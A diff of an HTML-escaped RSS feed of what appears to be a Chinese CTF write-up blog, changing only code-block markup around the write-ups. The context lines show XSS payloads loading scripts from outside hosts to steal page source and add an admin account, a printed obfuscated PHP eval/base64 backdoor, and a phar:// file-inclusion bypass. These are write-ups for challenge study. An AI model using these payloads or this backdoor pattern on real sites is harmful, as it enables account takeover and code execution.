+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;然后找到了p神这篇文章&lt;/p&gt;
 
@@ -1235,17 +1281,16 @@ test code 2
 
 &lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3365764845.png&quot; alt=&quot;3365764845&quot; /&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
 --.  ..  ..-.  ---..  ----.  .-  ;
 
 &amp;lt;..--..  .--.  ....  .--.   $.-   = &quot;-----  .-.-.-  .----  &quot;;$-...   = $_--.  .  -  [.----.  -...  .----.  ];..  ..-.  ($-...   -.-.--  = .----.  .----.  ){    ..  ..-.   (..  ...  _.-  .-.  .-.  .-  -.--  ($-...  )){        .  -.-.  ....  ---   &quot;-.  ---   -.-  .  -.--  -.-.--  &quot;;        .  -..-  ..  -  ;    }.  .-..  ...  .  ..  ..-.  (-.-.--  ..  ...  _-.  ..-  --  .  .-.  ..  -.-.  ($-...  )){       $-.-.   = (..  -.  -  )(($.-   + $-...  ) * .----  -----  );        ..  ..-.   ($-.-.   == &quot;---..  &quot; &amp;amp;&amp;amp; $-...  [.----  -----  ] == ..-.  .-  .-..  ...  .  ){            .  -.-.  ....  ---   &quot;..-.  .-..  .-  --.  &quot;;        }.  .-..  ...  .  {            .  -.-.  ....  ---   &quot;-.  ---   -.-  .  -.--  -.-.--  &quot;;            .  -..-  ..  -  ;        }    }.  .-..  ...  .  {        .  -.-.  ....  ---   &quot;-.  ---   -.-  .  -.--  -.-.--  &quot;;    }}.  .-..  ...  .  {    .  -.-.  ....  ---   &quot;-.  ---   -.-  .  -.--  -.-.--  &quot;;}..--..  &amp;gt;
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;可以看到是莫尔斯编码加上了php的一些语法，把莫尔斯编码还原之后就可以得到php代码&lt;/p&gt;
 
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
 GIF89a;
 
 &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
@@ -1302,8 +1347,7 @@ GIF89a;
 
 &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;就是要想办法绕过 对is_array和is_numeric的检查，进入flag的分支里&lt;/p&gt;
 
@@ -1323,17 +1367,16 @@ GIF89a;
 
 &lt;p&gt;这题其实是一个xss的题目，因为页面描述说管理员会记录你的一切操作。先打了一发cookie，然后修改cookie。发现直接跳到首页，并没有什么卵用。后面用ajax偷到了页面的源码。通过分析源码发现，有一个添加用户的地方。首先xss的payload&lt;/p&gt;
 
-&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/textarea&amp;gt;&lt;/span&gt;'&quot;&amp;gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://t.cn/R2CvZvl&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3409089775.png&quot; alt=&quot;3409089775&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;然后我们构造一个ajax添加一个账号。&lt;/p&gt;
 
-&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
 &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
 
@@ -1432,16 +1475,14 @@ GIF89a;
 
 
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;然后提交&lt;/p&gt;
 
-&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://km2.in/360.js&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;登陆之后成功拿到flag&lt;/p&gt;
 
@@ -1485,7 +1526,7 @@ GIF89a;
 
 &lt;p&gt;只是有一个分割的问题，一开始用,去分割就没有做出来，要用空格来分割，可以得到&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
 BHUK,LP 
 
 BHUK,LP 
@@ -1510,34 +1551,31 @@ TGBNHGYT
 
 UYGBN
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;一共有3类&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
 BHUK,LP
 
 UYGBN
 
 TGBNHGYT
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;我们尝试在键盘上把他们画出来，记得,也要占一个键位的&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-1076458764.jpg&quot; alt=&quot;1076458764&quot; /&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
 BHUK,LP   ：N
 
 UYGBN     ：C
 
 TGBNHGYT  : B
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;然后就是按照他的顺序输出flag了&lt;/p&gt;
 
@@ -1547,15 +1585,14 @@ TGBNHGYT  : B
 
 &lt;p&gt;给了一个shell文件，提示是后门的密码就是flag&lt;/p&gt;
 
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
 &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; 
 
 &lt;span class=&quot;k&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;gzinflate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;base64_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;pZLdSsNAEIXvBd+hTmOzMXTbFC3UGhtFEANWlLZES5OgvauoIFho2jy7s7PJhMSIF5Kbb2fPzs+Z7O8ZiYAmhLAFS9bQzhUQIboUPECKiUQDMSFMkYZIZt+U5nFkYijB0Kh0KfCcp+5wlh+6YaO2H9VFbW2BNK8U2iJJoiOk9Pek4q/ZBTwG481T4HeD3mC9vH79en67fb+fjScPM38aOMvL6erEn6xePm+uLj7u1i669I9qAucL4ZSDesQWC9WwHlGxkZRpwW9t1ikrDCRwAE87dtvm7EphlRQd3taC6AwpIjJ4A4XFkhcQ81uhbZcw6EN20a67mHPHxX8Qc+YQP7vyvxQJIHNBa9usUBMcck5d1kNqEVmZl9CDkmNNnsLIFV3IKnsVRT4OOCQJdRNq76Pzbw==&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt;
 
 &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;有这种解eval的特别方便的&lt;/p&gt;
 
@@ -1607,7 +1644,7 @@ NTU2NJC3ODHHYWJIZ3P4ZWY=
         <description>&lt;p&gt;这个方法适用于验证包含文件为特定后缀时。
 例如以下代码&lt;/p&gt;
 
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
 &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
 &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'file'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strtolower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;.jpg&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
@@ -1619,8 +1656,7 @@ NTU2NJC3ODHHYWJIZ3P4ZWY=
 &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'file'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.jpg'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;上面的代码一个验证了后缀是否为jpg，一个是直接添加了jpg后缀，然后才包含。对于现在这种情况，要包含php文件的话的，可以通过截断。但是\x00的截断在php&amp;gt;5.3.4就没用了，而且还要考虑GPC,所以是比较鸡肋的方法。其实我们可以通过zip协议和phar协议来包含文件。&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;zip://&lt;/strong&gt;&lt;/p&gt;
@@ -1641,14 +1677,13 @@ NTU2NJC3ODHHYWJIZ3P4ZWY=
 
 &lt;p&gt;首先我们要用phar类打包一个phar标准包&lt;/p&gt;
 
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
 &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;PharData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dirname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__FILE__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/phartest2.zip'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'phartest2'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Phar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;ZIP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
 &lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'./php.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addFromString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'a.jpg'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
 &lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
 &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;会生成一个zip的压缩文件。然后我们构造&lt;/p&gt;
 
 &lt;p&gt;http://127.0.0.1/file.php?file=phar://php.zip/php.jpg&lt;/p&gt;
